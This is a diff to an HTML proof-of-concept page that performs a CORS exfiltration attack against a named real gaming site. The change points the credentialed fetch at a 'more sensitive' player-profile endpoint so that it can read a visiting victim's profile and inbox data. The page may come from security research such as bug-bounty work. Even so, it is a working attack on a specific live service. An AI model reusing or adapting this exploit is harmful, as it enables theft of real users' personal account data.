@@ -105,7 +105,7 @@
             will attempt to retrieve your session data.
         </p>
 
-        <div class="status" id="statusBox">Target: scf-service/client</div>
+        <div class="status" id="statusBox">Target: player-profile-api/client/details</div>
 
         <button id="exploitBtn">Trigger CORS Exfiltration</button>
 
@@ -124,8 +124,8 @@
             resultPre.style.display = 'none';
             exploitBtn.disabled = true;
 
-            // Target endpoint that reflects Origin + sets ACAC: true
-            const targetUrl = "https://play.slotomania.com/scf-service/client";
+            // Targeting MORE SENSITIVE endpoint found via browser traffic
+            const targetUrl = "https://play.slotomania.com/player-profile-api/client/details?subFeature=inbox";
 
             fetch(targetUrl, {
                 method: "GET",
